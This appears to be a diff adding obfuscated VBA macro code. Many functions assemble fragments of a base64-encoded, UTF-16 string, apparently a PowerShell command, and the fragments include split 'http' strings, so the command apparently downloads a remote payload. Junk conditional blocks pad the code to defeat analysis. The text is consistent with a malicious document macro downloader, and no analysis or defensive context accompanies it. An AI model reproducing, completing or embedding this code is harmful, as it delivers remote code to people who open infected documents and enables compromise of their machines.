+KOgfb6 = "nACk" + "AKwAnA" + "HQAZ" + "gAuAG" + "4AJwA" + "rACcAb"
+Bs___dW = r__OKm + Vw_SWu + U_wIu_9 + WnC5__ + bzGEpA + nF___B7 + oi_PnY + V77c_if + w_w_QA5 + O_jGETx + N_e__T + KOgfb6
+If TEl1_b Or OblhB_l Then
+' STRIPPED LINE
+End If
+End Function
+Function A_Pc_y_()
+If vYX_7_c Or Y_AV_1_ Then
+' STRIPPED LINE
+End If
+jfKK_D_ = "wBxAF8" + "AeAA" + "9AH" + "EAYgAn" + "ACs" + "AKAAnA"
+If L_QSBj Or d8fHuvu Then
+' STRIPPED LINE
+End If
+If tY0d8_ Or K_s_WlR Then
+' STRIPPED LINE
+End If
+iZJ_Hz = "EEAJw" + "ArACcA" + "OAB" + "oAHE" + "AKQAoA" + "CcAKw" + "AnADYA" + "QQAzA" + "GMAJ"
+If CDi_ef Or ympTwZ Then
+' STRIPPED LINE
+End If
+If Hnpj4_B Or iNV_DH9 Then
+' STRIPPED LINE
+End If
+p___sJ = "wAp" + "ACsAJw" + "BpACcA" + "KwAn" + "AGwA" + "ZAB" + "lAH" + "IAJw" + "ArACcA"
+If G9Wg__S Or iU7EoD Then
+' STRIPPED LINE
+End If
+oK_30TU = "cQB" + "fAHgAP" + "QBx" + "ADE" + "AJwAr" + "ACgAJw" + "BBAD"
+If OW_J8Os Or FLk_iWI Then
+' STRIPPED LINE
+End If
+wELm2I = "gAJ" + "wArACc" + "AaABx" + "ACkA" + "KAA" + "nACsAJ" + "wA2AE"
+If BRV_Qs Or q8zufMb Then
+' STRIPPED LINE
+End If
+ObKE_ZL = "EAJw" + "ArA" + "CcA" + "MwBjA" + "CcA" + "KQArA" + "CcAX"
+If w_3FYJT Or S_sZ_0n Then
+' STRIPPED LINE
+End If
+If hI6Ztx Or qX_3K_R Then
+' STRIPPED LINE
+End If
+N_5k5M = "wAn" + "ACsAJ" + "wAxAGU" + "AZAAn" + "ACs" + "AKA" + "AnA" + "CcAK"
+A_Pc_y_ = jfKK_D_ + iZJ_Hz + p___sJ + oK_30TU + wELm2I + ObKE_ZL + N_5k5M
+If FOgr_Ka Or CIIpsml Then
+' STRIPPED LINE
+End If
+End Function
+Function w0U__As()
+If x6__ut Or suU0D_ Then
+' STRIPPED LINE
+End If
+USVTYh = "wAnAEE" + "AOABo" + "AHEAK" + "QAoADY" + "AQQAn" + "ACsA"
+If b_c_R43 Or r___Oa Then
+' STRIPPED LINE
+End If
+ZT_XCR = "JwAzA" + "GMAJw" + "ApAC" + "sAJwA" + "5AGU" + "AMQAn" + "ACs" + "AJwBi"
+If Lr_j_V8 Or mFiX__h Then
+' STRIPPED LINE
+End If
+If wtOxs_ Or nFmZ_VL Then
+' STRIPPED LINE
+End If
+If j2m__7_ Or u8W___H Then
+' STRIPPED LINE
+End If
+I_L_Bo = "ADc" + "AZQB" + "kACcA" + "KwAo" + "ACcA" + "QQAn" + "ACsAJ" + "wA4AGg" + "AcQAp"
+If Dk9U__ Or J__xj3 Then
+' STRIPPED LINE
+End If
+hIcp_bQ = "ACgAN" + "gAn" + "ACsA" + "JwBBA" + "DMAY" + "wAnACk"
+If tBYr_VC Or pF__ZLs Then
+' STRIPPED LINE
+End If
+Ul__ZF_ = "AKwA" + "nAD" + "AAMwAn" + "ACs" + "AKAA"
+If K20cU_2 Or PY_L_n Then
+' STRIPPED LINE
+End If
+If z_CSaXm Or F__prFk Then
+' STRIPPED LINE
+End If
+OIUKQp = "nAE" + "EAJwAr" + "ACcA" + "OABoAH" + "EAKQA" + "oACcA" + "KwA"
+If ck_bmr_ Or y_p9_l Then
+' STRIPPED LINE
+End If
+x____FP = "nADYAQ" + "QAzAGM" + "AJwApA" + "CsAJw" + "A4ADk"
+If cZBTbMJ Or BEKlPj Then
+' STRIPPED LINE
+End If
+If G_w_jp_ Or iURY4_B Then
+' STRIPPED LINE
+End If
+i5_M_xh = "AJw" + "ArAC" + "cAZQB" + "hADMAJ" + "wArACg" + "AJw" + "BBADg" + "AJwArA"
+If p_Yf_Sh Or o__gYT4 Then
+' STRIPPED LINE
+End If
+If MGQY2Ip Or z9wHf_ Then
+' STRIPPED LINE
+End If
+If n__u4N1 Or k_5_lX Then
+' STRIPPED LINE
+End If
+l_I5qO = "CcAa" + "ABx" + "ACkAKA" + "A2AEE" + "AJwAr" + "ACcAM" + "wBjACc" + "AKQAr" + "ACc"
+If rP_L0_p Or q_78Je Then
+' STRIPPED LINE
+End If
+If yk__7i4 Or e_GkLYt Then
+' STRIPPED LINE
+End If
+TldWf7 = "ANA" + "AnA" + "CsA" + "JwAz" + "AGEAMQ" + "AnACs"
+If Z__EKp Or j_32x9 Then
+' STRIPPED LINE
+End If
+If RBCkmY Or ai_BN_ Then
+' STRIPPED LINE
+End If
+j_PuMt = "AKAAnA" + "EEAOAA" + "nAC" + "sAJwBo" + "AHEA" + "KQA" + "oADYAJ"
+If x_UVak Or n_na_1 Then
+' STRIPPED LINE
+End If
+B5L1fBj = "wArA" + "CcAQQA" + "zAGMAJ" + "wApACs" + "AJwBiA" + "GIAMg" + "AnAC" + "sAK" + "AAnACc"
+w0U__As = USVTYh + ZT_XCR + I_L_Bo + hIcp_bQ + Ul__ZF_ + OIUKQp + x____FP + i5_M_xh + l_I5qO + TldWf7 + j_PuMt + B5L1fBj
+If HXZ9_e Or Sz___x Then
+' STRIPPED LINE
+End If
+If mS_6n_E Or KdIKEW_ Then
+' STRIPPED LINE
+End If
+If AuG_MO Or O_djKJ7 Then
+' STRIPPED LINE
+End If
+End Function
+Function M_EkFn()
+If qSWTLZQ Or XzIDuT_ Then
+' STRIPPED LINE
+End If
+If sv__b1N Or R9uiN_o Then
+' STRIPPED LINE
+End If
+A_xEevh = "AKwAn" + "AEEAO" + "ABoAH" + "EAKQA" + "oADYAJ" + "wAr" + "ACcAQQ" + "AzAGM"
+If a_low4 Or MS3T_fe Then
+' STRIPPED LINE
+End If
+If s_am5r Or kFw_6dY Then
+' STRIPPED LINE
+End If
+l_SvJp = "AJwA" + "pACsA" + "JwBiAD" + "gAJw" + "ArACg" + "AJw" + "BBA"
+If q4U0kVu Or Lqng_q Then
+' STRIPPED LINE
+End If
+If Zl_q_I Or VOTWV_ Then
+' STRIPPED LINE
+End If
+tO__Q_ = "CcAKw" + "AnA" + "DgAa" + "ABxACk" + "AKAA2A" + "CcA" + "KwAnA" + "EEAMw"
+If B_PUFA Or u_T0Jf Then
+' STRIPPED LINE
+End If
+B__hc_r = "BjA" + "CcAKQ" + "ArACc" + "AJwA" + "rAC" + "cAN" + "ABiAC" + "cAK" + "wAn"
+If XSMcs_ Or xn_j3c Then
+' STRIPPED LINE
+End If
+If zu_p2cP Or Syw__g Then
+' STRIPPED LINE
+End If
+If U_YnDF Or XN_1Z_ Then
+' STRIPPED LINE
+End If
+xsw_q_x = "ADkAZQ" + "AnACsA" + "KAAnA" + "EEA" + "OAA" + "nACs" + "AJwB"
+If h0_tlN_ Or QgCulC Then
+' STRIPPED LINE
+End If
+If J_jt_k_ Or nR_fv__ Then
+' STRIPPED LINE
+End If
+wa_5P9 = "oAHEAK" + "QAo" + "ADYAQ" + "QAz" + "AGM" + "AJwApA"
+M_EkFn = A_xEevh + l_SvJp + tO__Q_ + B__hc_r + xsw_q_x + wa_5P9
+If o_tu2X_ Or MDaAh_H Then
+' STRIPPED LINE
+End If
+If K_VAEJ Or G_gm_3 Then
+' STRIPPED LINE
+End If
+End Function
+Function C5__i_H()
+If Vmze_m Or zeeuE_ Then
+' STRIPPED LINE
+End If
+TPe_6_ = "CsA" + "JwA" + "4ACcAK" + "wAnADI" + "ALgB" + "qAH" + "AAJw"
+If E____j_ Or uSOd05U Then
+' STRIPPED LINE
+End If
+If VZdfLJD Or bsLH_D0 Then
+' STRIPPED LINE
+End If
+If ZTw_11 Or E_vR_L Then
+' STRIPPED LINE
+End If
+j_NZ__8 = "ArAC" + "gAJwBB" + "ACc" + "AKw" + "AnADgA" + "aABxAC" + "kAKAA2" + "ACcA" + "KwAn"
+If DL4y9g3 Or ir_v__ Then
+' STRIPPED LINE
+End If
+Ex_ToS = "AEE" + "AMwBj" + "ACcA" + "KQArA" + "CcAZ" + "wAnAC" + "sAKA" + "AnA" + "EEAO"
+If EUc_z_G Or O_r__A Then
+' STRIPPED LINE
+End If
+If PB__P_ Or Djf__s Then
+' STRIPPED LINE
+End If
+If zE0sLO Or DHgS_Rk Then
+' STRIPPED LINE
+End If
+Dry_CO_ = "AAnA" + "CsA" + "JwB" + "oAH" + "EAKQAo" + "ADY"
+If vXhqOD Or jINR_H Then
+' STRIPPED LINE
+End If
+x_x_DI = "AJwArA" + "CcAQQA" + "zAGMA" + "JwA" + "pACsA" + "JwA" + "nACsA" + "JwBA" + "AGgA"
+If RD0b5Y Or ML__13 Then
+' STRIPPED LINE
+End If
+M0Lz_5s = "dAAn" + "ACsA" + "JwB0AH" + "AAJwA" + "rACc" + "AcwA6" + "ACcA"
+If T__a_v Or u8sVKq Then
+' STRIPPED LINE
+End If
+HDo_VCX = "KwA" + "oAC" + "cAJwA" + "rAC" + "cAQ" + "QA4AGg" + "AcQAp" + "ACgAN" + "gBBAC"
+If Q_C7RZ Or O4o___ Then
+' STRIPPED LINE
+End If
+If YEa53I Or J__4_1t Then
+' STRIPPED LINE
+End If
+If yYFAHZ_ Or vqKDPa Then
+' STRIPPED LINE
+End If
+ViX8rV_ = "cAKwAn" + "ADMAY" + "wAnA" + "CkA" + "KwA" + "nAH" + "EAXw"
+If uo__vj Or Z_Hdc_ Then
+' STRIPPED LINE
+End If
+SGq_ixp = "B4A" + "D0Ac" + "QBxAF" + "8AeA" + "A9A" + "HEAaAA" + "nACs" + "AJwB" + "lAGwA"
+C5__i_H = TPe_6_ + j_NZ__8 + Ex_ToS + Dry_CO_ + x_x_DI + M0Lz_5s + HDo_VCX + ViX8rV_ + SGq_ixp
+If hYTkc0_ Or r3WOJd Then
+' STRIPPED LINE
+End If
+If pS1FwSA Or RS_0vr_ Then
+' STRIPPED LINE
+End If
+End Function
+Function kRNg_J_()
+If bZD_Qn Or oSTw6vS Then
+' STRIPPED LINE
+End If
+d_S8m_ = "cwB" + "lACcA" + "KwAoAC" + "cAQQAn" + "ACsAJ" + "wA4AGg"
+If a__cJ_ Or pZc_KgG Then
+' STRIPPED LINE
+End If
+If xPE_zw Or e9V_fY Then
+' STRIPPED LINE
+End If
+If Jga8__ Or sfohYoL Then
+' STRIPPED LINE
+End If
+R8Wv_ZU = "AcQ" + "ApA" + "CgAN" + "gBB" + "ACcA" + "KwAnA" + "DMAY"
+If n_p_Vt Or i8H_GL_ Then
+' STRIPPED LINE
+End If
+If pGNPpR Or D_5_lL Then
+' STRIPPED LINE
+End If
+Gmu__mE = "wAnACk" + "AKwAnA" + "CcAKwA" + "nAG" + "MAd" + "ABmAC4" + "AJwAr" + "ACgAJw" + "AnACsA"
+If z_tB88_ Or NMRo_s Then
+' STRIPPED LINE
+End If
+If rNSN0_l Or UYAHjh Then
+' STRIPPED LINE
+End If
+lK___C2 = "JwBBAD" + "gAa" + "ABxACk" + "AKAAn" + "ACsAJw" + "A2AEEA" + "MwB" + "jACcA" + "KQArA"
+If JwLrdj_ Or XeJcBQ Then
+' STRIPPED LINE
+End If
+Zt_8PC = "CcAbg" + "AnA" + "CsAJwB" + "vAH" + "EAX" + "wB4AD0" + "AcQA" + "nACs" + "AKAAnA"
+If n_rKIG Or RBubB_9 Then
+' STRIPPED LINE
+End If
+bNl9712 = "EEAOA" + "BoAHEA" + "KQAo" + "ADY" + "AQQAn" + "ACsAJw" + "AzAGMA" + "JwApA" + "CsAJwB"
+If dCt_c_4 Or LcHtI_t Then
+' STRIPPED LINE
+End If
+xeRVQc = "iAC" + "cAKwA" + "nAGkA" + "bAB" + "kACcAK" + "wAoACc"
+If JYY_1_q Or E1_S_V Then
+' STRIPPED LINE
+End If
+uS4___ = "AQQA4A" + "CcAKw" + "AnA" + "GgAcQ" + "ApAC" + "gAJwAr" + "ACcAN" + "gBBADM" + "AYwAnA"
+If Q_r__e Or F__nJ_ Then
+' STRIPPED LINE
+End If
+If vcT_Gi Or eDUAhlg Then
+' STRIPPED LINE
+End If
+If Lq3Wos Or tt8J_Z Then
+' STRIPPED LINE
+End If
+c_2C__ = "CkA" + "KwAnA" + "CcAK" + "wAn" + "AGUA" + "cgAn"
+If TiRROb Or ulxJ_a Then
+' STRIPPED LINE
+End If
+If al5XxZ2 Or Yq7gSC Then
+' STRIPPED LINE
+End If
+If j_hS___ Or mMBu1Gc Then
+' STRIPPED LINE
+End If
+Ssl__w = "ACsAKA" + "AnAEEA" + "OABo" + "AHEA" + "KQAoAD" + "YAQQAz"
+kRNg_J_ = d_S8m_ + R8Wv_ZU + Gmu__mE + lK___C2 + Zt_8PC + bNl9712 + xeRVQc + uS4___ + c_2C__ + Ssl__w
+If aXR_hDt Or mtR__a Then
+' STRIPPED LINE
+End If
+If G_ByDT Or Z_u__p Then
+' STRIPPED LINE
+End If
+If yiWNai_ Or AuP3_T Then
+' STRIPPED LINE
+End If
+End Function
+Function BLs__N()
+If zd_Erf Or Z__g_E Then
+' STRIPPED LINE
+End If
+h_p799g = "AGMAJw" + "ApA" + "CsAJw" + "AnAC" + "sAJ" + "wBxA" + "F8AeA" + "A9AHE" + "AMgBfA"
+If jKP_Od2 Or Is_d__ Then
+' STRIPPED LINE
+End If
+If Q_HkX8J Or k5TWG_ Then
+' STRIPPED LINE
+End If
+If NnL4A92 Or h8uL9I Then
+' STRIPPED LINE
+End If
+S92nmVf = "CcAK" + "wAoACc" + "AQQA" + "4AGgA" + "cQApA" + "CgANg"
+If a_Zf_U5 Or Dpz4B_q Then
+' STRIPPED LINE
+End If
+yftKvw = "AnAC" + "sAJwBB" + "ADMAYw" + "AnACkA" + "KwAn" + "AGMAJw" + "ArA" + "CgAJw" + "AnACs"
+If g___G_ Or C___mJ Then
+' STRIPPED LINE
+End If
+If q_LB4Mx Or gha_fb Then
+' STRIPPED LINE
+End If
+Wu_G_21 = "AJw" + "BBADg" + "AaA" + "BxACkA" + "KAA2AC" + "cAKw" + "AnAEEA"
+If SrTwp_ Or VV_a__ Then
+' STRIPPED LINE
+End If
+If sGeIpbX Or SMgk_2 Then
+' STRIPPED LINE
+End If
+Ms_zK4 = "MwB" + "jACcAK" + "QArACc" + "AMg" + "A1AC" + "cAK"
+If NW__ttK Or R3vHSO Then
+' STRIPPED LINE
+End If
+If OdA9yO Or cLiarqn Then
+' STRIPPED LINE
+End If
+If S3_SQ_x Or w3NqJHT Then
+' STRIPPED LINE
+End If
+P_nzW0u = "wAn" + "AGQAZg" + "AnAC" + "sAJwA1" + "ADk" + "ANAAnA" + "CsAKA" + "AnAC"
+If m0___kT Or QtmmD_ Then
+' STRIPPED LINE
+End If
+If Eb7Wmj Or A_LR_Ff Then
+' STRIPPED LINE
+End If
+Dx_aY_ = "cAKwA" + "nAEE" + "AOABo" + "AHEAKQ" + "AoADYA"
+BLs__N = h_p799g + S92nmVf + yftKvw + Wu_G_21 + Ms_zK4 + P_nzW0u + Dx_aY_
+If H_ZYxx Or NqwcqY Then
+' STRIPPED LINE
+End If
+If gCZf2m Or od_v7C Then
+' STRIPPED LINE
+End If
+If AYv_tH_ Or htJI_2 Then
+' STRIPPED LINE
+End If
+End Function
+Function YvC___t()
+If wMQ___ Or WsOlka Then
+' STRIPPED LINE
+End If
+If YBuJeP Or FHO_Q2 Then
+' STRIPPED LINE
+End If
+CtQ_vl_ = "QQAzA" + "GMAJwA" + "pAC" + "sAJw" + "A0AC" + "cAKwA" + "nAGUAN" + "AA5ACc" + "AKwAnA"
+If O_K_D_ Or VmC_W_v Then
+' STRIPPED LINE
+End If
+If ae63_27 Or tNsWTT Then
+' STRIPPED LINE
+End If
+If R_E9qNC Or c_LKupD Then
+' STRIPPED LINE
+End If
+N__ONg5 = "GYANQ" + "AxA" + "CcAKwA" + "oACc" + "AQQA" + "nAC" + "sAJ" + "wA4AGg" + "AcQ"
+If s6___i Or L_IAB_ Then
+' STRIPPED LINE
+End If
+u2bwI_ = "ApAC" + "gANgB" + "BAC" + "cAKw" + "AnAD" + "MAY"
+If iAKSJp Or ow_1z_ Then
+' STRIPPED LINE
+End If
+If z_ldx3_ Or Pr__hX Then
+' STRIPPED LINE
+End If
+If oS9__6_ Or l7e8vU Then
+' STRIPPED LINE
+End If
+hF__k3_ = "wAnA" + "CkAKwA" + "nAC" + "cAKwA" + "nADMA" + "OQAz"
+If Tr_Ce_ Or zi__uo Then
+' STRIPPED LINE
+End If
+If GT_sW1 Or UrC4Hh Then
+' STRIPPED LINE
+End If
+e__t_B = "ADc" + "AJwAr" + "ACcA" + "ZAB" + "kADAAJ" + "wArACg" + "AJwBBA" + "CcAKw"
+If Bn_HJg Or N0_99w Then
+' STRIPPED LINE
+End If
+If sm4hn5 Or Y_So__ Then
+' STRIPPED LINE
+End If
+If vlYoRQ Or ayRXfi Then
+' STRIPPED LINE
+End If
+TRD_VD = "AnA" + "DgAaAB" + "xAC" + "kAKAA" + "nAC" + "sAJwA2"
+If PU__HP Or MCFnEl Then
+' STRIPPED LINE
+End If
+If Wd_M_Wm Or rLiQs__ Then
+' STRIPPED LINE
+End If
+K_xl26 = "AEEA" + "MwBjAC" + "cAKQAr" + "ACcAN" + "wA3ACc" + "AKwAn" + "ADkAN" + "AA3AC"
+If diit0__ Or obqYl_ Then
+' STRIPPED LINE
+End If
+If C__l_no Or wUI__N Then
+' STRIPPED LINE
+End If
+ssg9_Cb = "cAK" + "wAoA" + "CcAJwA" + "rAC" + "cAQQ"
+If j_PhWt5 Or z_d_MY3 Then
+' STRIPPED LINE
+End If
+HA_7_W = "A4ACc" + "AKw" + "AnAG" + "gAc" + "QApACg" + "ANg" + "AnACsA" + "JwBB"
+YvC___t = CtQ_vl_ + N__ONg5 + u2bwI_ + hF__k3_ + e__t_B + TRD_VD + K_xl26 + ssg9_Cb + HA_7_W
+If N_xRiof Or yt_Rma Then
+' STRIPPED LINE
+End If
+If GIRp3_ Or EXV1EC Then
+' STRIPPED LINE
+End If
+End Function
+Function z5Qa_f_()
+If RF_d_b Or SK_fOK Then
+' STRIPPED LINE
+End If
+p_x25M = "ADMAY" + "wAnAC" + "kAK" + "wAnAC" + "cAKwAn" + "AGYAYg" + "A1AC"
+If NwaKlnG Or cwzp96 Then
+' STRIPPED LINE
+End If
+If OR___T Or vqr__ex Then
+' STRIPPED LINE
+End If
+DwxDBt = "cAK" + "wAoAC" + "cAJw" + "ArAC" + "cAQ" + "QA4AGg"
+If w6d__f Or CC3Cgx Then
+' STRIPPED LINE
+End If
+gdZ_PzF = "AcQAp" + "ACgA" + "NgBBAC" + "cAKw" + "AnADM" + "AYw" + "AnA"
+If J_b_W_ Or yL4_h__ Then
+' STRIPPED LINE
+End If
+If F_N7_m Or k_H_Ud Then
+' STRIPPED LINE
+End If
+rshMD_ = "CkAKw" + "AnADA" + "AJwAr" + "ACg" + "AJwBB"
+If U9_2_E Or gPT__t Then
+' STRIPPED LINE
+End If
+B_wnBA = "ADgAaA" + "BxAC" + "kAK" + "AAnA" + "CsAJ"
+If V_Mh6cZ Or UiuFQqq Then
+' STRIPPED LINE
+End If
+If F3cPyR Or gzlztn Then
+' STRIPPED LINE
+End If
+KtZF8Rv = "wA2AE" + "EAMwB" + "jACc" + "AKQ" + "ArACcA" + "NAA" + "uAC" + "cAKwAn"
+If Mj_hPw Or zMIoSa_ Then
+' STRIPPED LINE
+End If
+u4_ShnU = "AGoAcA" + "AnACs" + "AKA" + "AnAEE" + "AOA" + "BoA"
+If B_x5_wc Or l3_ewY Then
+' STRIPPED LINE
+End If
+S_4c3_ = "HEAKQ" + "AoADY" + "AQQAzA" + "GMAJ" + "wAp" + "ACsAJ"
+If Dzf5_C Or qJ___ya Then
+' STRIPPED LINE
+End If
+hkfmOT1 = "wBnA" + "CcAKwA" + "nAEAA" + "aAB" + "0ACcAK" + "wAnAH" + "QAcAA" + "nAC" + "sAK"
+If w_g2jlk Or ns_NDvm Then
+' STRIPPED LINE
+End If
+rdJMM0 = "AAnA" + "CcAK" + "wAnAE" + "EAOABo" + "AHE" + "AKQAo" + "ADYA"
+If ZQRHq_ Or QV90mK_ Then
+' STRIPPED LINE
+End If
+F0OU2_ = "QQA" + "nACsAJ" + "wAzA" + "GMA" + "JwAp" + "ACsA" + "JwB" + "zAD" + "oAcQBf"
+z5Qa_f_ = p_x25M + DwxDBt + gdZ_PzF + rshMD_ + B_wnBA + KtZF8Rv + u4_ShnU + S_4c3_ + hkfmOT1 + rdJMM0 + F0OU2_
+If Ap_3_v Or DhZF_Y9 Then
+' STRIPPED LINE
+End If
+If f_nl_Z Or C__i__ Then
+' STRIPPED LINE
+End If
+End Function
+Function H__8qW()
+If U_____6 Or m__u50M Then
+' STRIPPED LINE
+End If
+If WkkWk_ Or S__I_k Then
+' STRIPPED LINE
+End If
+b_x5hQ = "AHgA" + "PQBx" + "ACcAK" + "wAoAC" + "cAJwA"
+If sJS_q0_ Or w_CI8rw Then
+' STRIPPED LINE
+End If
+TczNxH = "rACcAQ" + "QA4A" + "GgAc" + "QApAC" + "gANg" + "AnAC" + "sAJwBB"
+If Rz___V_ Or r_S8sbM Then
+' STRIPPED LINE
+End If
+xRBo6Tx = "ADMA" + "YwAnA" + "CkA" + "KwAnAH" + "EAXw" + "B4AD" + "0AcQAn"
+If vWR_6_ Or y7BkP_Q Then
+' STRIPPED LINE
+End If
+If OH_R_yQ Or lG_p2Qq Then
+' STRIPPED LINE
+End If
+If aolrO_ Or T_gw7u Then
+' STRIPPED LINE
+End If
+AM2jCQ = "ACs" + "AKAAn" + "AEE" + "AOA" + "BoAHE" + "AKQ" + "AoADYA" + "QQA"
+If vWA9_J Or pw_5__ Then
+' STRIPPED LINE
+End If
+Jnb_c_b = "nACs" + "AJwAzA" + "GMA" + "JwApA" + "CsA" + "JwBo" + "AGU" + "AJw" + "ArACcA"
+If o_MWx_f Or ZfbcxA_ Then
+' STRIPPED LINE
+End If
+If sQfdV_ Or ObAKsg Then
+' STRIPPED LINE
+End If
+If BBU5C_ Or O_t_3_ Then
+' STRIPPED LINE
+End If
+gjmA_v_ = "bAB" + "zAGUAJ" + "wArACg" + "AJwBB" + "ACcAKw" + "AnADg" + "AaA" + "BxACk" + "AKAA2"
+If M_a_Fl Or Fq1fKf Then
+' STRIPPED LINE
+End If
+If So__uE_ Or ioE0Yg Then
+' STRIPPED LINE
+End If
+xZ__to = "ACcA" + "KwA" + "nAEEA" + "MwBjA" + "CcAKQ" + "ArACcA" + "YwA" + "nACsAK" + "AAn"
+If OFS_6qr Or RVAQv5 Then
+' STRIPPED LINE
+End If
+If MOf_Io Or hx_BUM Then
+' STRIPPED LINE
+End If
+If IhG_Wr Or Qe0cvz_ Then
+' STRIPPED LINE
+End If
+vH_jN4_ = "AEE" + "AOAB" + "oAHE" + "AKQ" + "AoA" + "DYAQQA" + "zAGMA" + "JwAp" + "ACs"
+H__8qW = b_x5hQ + TczNxH + xRBo6Tx + AM2jCQ + Jnb_c_b + gjmA_v_ + xZ__to + vH_jN4_
+If BIVFAIx Or Z51Kzo Then
+' STRIPPED LINE
+End If
+If LS44y_E Or Q______ Then
+' STRIPPED LINE
+End If
+End Function
+Function FRya6S()
+If a9jl8T1 Or YZFH_Gk Then
+' STRIPPED LINE
+End If
+If MtqfJ_ Or e2FPB4 Then
+' STRIPPED LINE
+End If
+If NpaCmbl Or z_xufT Then
+' STRIPPED LINE
+End If
+dgJUnN = "AJw" + "B0A" + "CcAKw" + "AoACcA" + "QQAnAC"
+If kqIf__ Or E_63_EK Then
+' STRIPPED LINE
+End If
+If pOBY_8 Or k_O__l Then
+' STRIPPED LINE
+End If
+If l7_tes Or C_NHCE Then
+' STRIPPED LINE
+End If
+aty9Ro2 = "sAJwA" + "4AGgA" + "cQAp" + "ACg" + "ANg" + "BBAD" + "MAYwAn" + "ACkA"
+If LqkrIC Or g5__lnU Then
+' STRIPPED LINE
+End If
+If Kk_g_J9 Or a_H_wl_ Then
+' STRIPPED LINE
+End If
+F_oXqC = "KwAnA" + "CcAKwA" + "nAGYAL" + "gBuA" + "G8A" + "cQBfA"
+If pP___zH Or a5SSL3O Then
+' STRIPPED LINE
+End If
+If oS_NOW Or B0_XYC7 Then
+' STRIPPED LINE
+End If
+VgeB_C = "HgAPQ" + "BxAC" + "cAKw" + "AoACc" + "AQQA" + "nACsAJ" + "wA4AGg" + "AcQA" + "pACgAN"
+If Lsy__h Or e_j_W5 Then
+' STRIPPED LINE
+End If
+If d_i0PY6 Or W__O_h Then
+' STRIPPED LINE
+End If
+If LZYk0_ Or onA__dI Then
+' STRIPPED LINE
+End If
+y9_o26_ = "gAnACs" + "AJwB" + "BADMAY" + "wAnA" + "CkAK" + "wAnA" + "CcAKwA" + "nAGIAa" + "QBsAC"
+If z_Fw7h Or yeeRV_9 Then
+' STRIPPED LINE
+End If
+If oLK_5_ Or ix_JSN Then
+' STRIPPED LINE
+End If
+Z___h_ = "cAK" + "wAnAG" + "QAZQBy" + "ACc" + "AKwAo" + "ACcAJw"
+If uYAW_ZS Or JV6E6d_ Then
+' STRIPPED LINE
+End If
+If vy_3M_7 Or iOnm6F3 Then
+' STRIPPED LINE
+End If
+If M_4_HXR Or WtDh_p Then
+' STRIPPED LINE
+End If
+K__Yr_ = "ArA" + "CcAQQA" + "4AGgAc" + "QApA" + "CgAN" + "gAn"
+If qIZ2w_Q Or OTQ_b_ Then
+' STRIPPED LINE
+End If
+If rW_V5c Or JwlAtA Then
+' STRIPPED LINE
+End If
+k___gE0 = "ACs" + "AJw" + "BBA" + "DMA" + "YwA" + "nACk" + "AKwAnA"
+If yg9Bg_ Or XB_IOs_ Then
+' STRIPPED LINE
+End If
+If U_M___I Or gzXaMgT Then
+' STRIPPED LINE
+End If
+If Y_YnO_a Or rn__L_ Then
+' STRIPPED LINE
+End If
+PiFGUI = "HEAXwB" + "4AD" + "0AcQA" + "zACcA" + "KwA" + "nAF" + "8AYwA" + "yACc" + "AKwAo"
+If uaH4mP Or qKt_bO Then
+' STRIPPED LINE
+End If
+If u5__R7 Or L___gjz Then
+' STRIPPED LINE
+End If
+FQP_6Wy = "ACcAQQ" + "A4A" + "GgAc" + "QApAC" + "gANgB" + "BACcA" + "KwA"
+If I__H6x_ Or KISy_Uu Then
+' STRIPPED LINE
+End If
+y5P1G5N = "nADMAY" + "wAn" + "ACkAKw" + "AnAGMA" + "JwA" + "rACcAN"
+FRya6S = dgJUnN + aty9Ro2 + F_oXqC + VgeB_C + y9_o26_ + Z___h_ + K__Yr_ + k___gE0 + PiFGUI + FQP_6Wy + y5P1G5N
+If LbhK_p Or Vcp8a4k Then
+' STRIPPED LINE
+End If
+If BQxlDci Or K8__hxV Then
+' STRIPPED LINE
+End If
+End Function
+Function Vx_QZ3()
+If ZM6OgA_ Or zZa_Q_ Then
+' STRIPPED LINE
+End If
+If NsA_XDc Or Wl0S__ Then
+' STRIPPED LINE
+End If
+If qLrGEV_ Or WhaJ_8 Then
+' STRIPPED LINE
+End If
+LS_l__V = "QA5AG" + "MAJw" + "ArAC" + "cAMAA" + "3AGQA" + "JwA" + "rACgA" + "JwB"
+If sm_9he Or y_FRPS Then
+' STRIPPED LINE
+End If
+If CoZ_Al3 Or zf_fQM Then
+' STRIPPED LINE
+End If
+ZL_Ubyh = "BACcA" + "KwA" + "nADgAa" + "ABxACk" + "AKAAnA" + "CsA" + "JwA2AE"
+If n__jdX Or u9__lbC Then
+' STRIPPED LINE
+End If
+If i9z9_Ik Or FB_im_ Then
+' STRIPPED LINE
+End If
+P1cft_ = "EAMwB" + "jACc" + "AKQAr" + "ACc" + "AJwArA"
+If zxUc_v Or d_b_Yxl Then
+' STRIPPED LINE
+End If
+gk_k8u = "CcAMQ" + "A2A" + "GMAYw" + "AnAC" + "sAJw"
+If qYUn_yl Or gD_vF09 Then
+' STRIPPED LINE
+End If
+QKa6__ = "A5ADc" + "AJwA" + "rAC" + "gAJw" + "BBAD" + "gAJwAr" + "ACc"
+If NSY5GAc Or x_iIOB Then
+' STRIPPED LINE
+End If
+If L__Kf5 Or Oz_aQY Then
+' STRIPPED LINE
+End If
+If aAUnp09 Or SViZNG Then
+' STRIPPED LINE
+End If
+jqZMCVo = "AaA" + "BxAC" + "kAKA" + "A2A" + "EEAM" + "wBjAC"
+Vx_QZ3 = LS_l__V + ZL_Ubyh + P1cft_ + gk_k8u + QKa6__ + jqZMCVo
+If HObk5d Or bnqhV4Z Then
+' STRIPPED LINE
+End If
+If T9DQ__h Or gz_WJbN Then
+' STRIPPED LINE
+End If
+If Hd3_QQ Or rz2tt_ Then
+' STRIPPED LINE
+End If
+End Function
+Function DmyzpR_()
+If V_l_hUP Or t_g_d__ Then
+' STRIPPED LINE
+End If
+If S_gLHH Or AO7_F_7 Then
+' STRIPPED LINE
+End If
+a5V_n_ = "cAKQAr" + "ACc" + "AOQAyA" + "DUA" + "JwA" + "rACc" + "AOQAwA" + "DkAJw" + "ArA"
+If J_nB_e_ Or TlZd__ Then
+' STRIPPED LINE
+End If
+Nli_rni = "CgAJw" + "AnA" + "CsAJwB" + "BAD" + "gAa" + "ABxAC" + "kAKAA"
+If ehIzmwI Or VlEd7_ Then
+' STRIPPED LINE
+End If
+If GK3irK Or Fr_4Kz Then
+' STRIPPED LINE
+End If
+XEPA__r = "2AE" + "EAJwAr" + "ACc" + "AMwB" + "jACcA" + "KQA" + "rACcA" + "YwAn" + "ACsAJ"
+If OI_i__8 Or i__F_x Then
+' STRIPPED LINE
+End If
+If p6v0L_ Or s__n_Wp Then
+' STRIPPED LINE
+End If
